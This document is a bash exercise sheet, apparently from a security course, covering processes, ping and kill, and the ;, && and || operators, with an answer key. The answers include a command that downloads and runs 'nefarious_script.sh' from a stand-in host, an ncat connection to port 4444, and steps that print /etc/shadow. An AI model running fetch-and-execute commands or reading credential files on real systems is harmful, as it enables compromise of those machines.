# Bash Sorcery

## Instructions

### Running Commands and Managing Processes

- On your Alpine machine, list your current user's running processes.
  - How many do you see?
  - One of the processes is _not_ bash. What is its PID?
  - Run the same command three or four times. How does the PID of this process each time?
  
- Next, run: `ping --help`. Identify the command-line flag you need to send a specific number of pings.

- Use this flag to ping `google.com` 100 times. Note that you can't use your Terminal to issue new commands while this is running.

- Press `Ctrl + C` to stop the ping command. Then, run the same command in the background.

- List your running processes. 
  - What do you see in the list of processes?
  - What other peculiarity do you notice about the backgrounded ping?...

- Find the PID of the ping command you just ran. Run: `kill <PID of ping Process>`.
  - What happens to the strange behavior after running this command?
  - List your running processes one last time. Do you see what you expect?

### Flow Controls

#### Semicolon

- Use the semicolon operator to print both `/etc/passwd` and `/etc/shadow`.
  - **Note**: This should succeed.

- Try to use the semicolon operator to print `/etc/nonexistent` and `/etc/passwd`, _in that order_. 
  - What output does this generate?

#### Logical And (Double Ampersand)

- Use the double ampersand operator to print both `/etc/passwd` and `/etc/shadow`.
  - **Note**: This should succeed.

- Try to use the double ampersand operator to print `/etc/nonexistent` and `/etc/passwd`, _in that order_. 
  - How does this output differ from that generated by the semicolon?

#### Logical Or (Double Pipe)

- Try to print out the contents of `/etc/shadow`, and use the double pipes to print an error message if there's a problem.
  - Use `echo "String to print"` to print a message.
  - **Note**: This command should succeed, so it _will not_ print out your error message.

- Run the same command, but try to print the contents of `/etc/nonexistent` instead of `/etc/shadow`.
  - How does this output differ from that generated by the double ampersand?

## Questions

- Write a command line that attempts to use `ncat` to connect to port `4444` on host `172.18.1.16`. If the connection fails, try to ping the host, instead.
  - `ncat 172.18.1.16 4444 || ping 172.18.1.16`

- Write a command line that creates a new directory, called `New_Directory`, and then changes into that directory, _if and only if_ it was created successfully.
  - `mkdir New_Directory && cd New_Directory`

- Write a command line that uses `curl` to download the file at `http://fake.site/nefarious_script.sh`, and then runs it with `bash` _if and only if_ it downloaded successfully.
  - `curl -O http://fake.site/nefarious_script.sh && bash nefarious_script.sh && rm nefarious_script.sh`
  - `curl http://fake.site/nefarious_script.sh;`

- Write a command line that runs the command `planA`, and runs the command `planB` _if and only if_ `planA` fails.
  - **Note**: These aren't real commands, but write the line anyway! The logic of the solution is what matters—not the commands themselves.

## Extension

### Streams

- You can "mute" a backgrounded process by redirecting everything it prints to Linux's "black hole" for unwanted process output, called `/dev/null`.
  - TO do this with the ping example, you'd run: `ping -c 100 8.8.4.4 &> /dev/null`.
  - This runs the ping command, but throws away everything it prints to the terminal—including error information!
  - For more information, refer to Chapter 20 of the Advanced Bash Scripting Guide, on **I/O Redirection**: <https://www.tldp.org/LDP/abs/html/io-redirection.html>

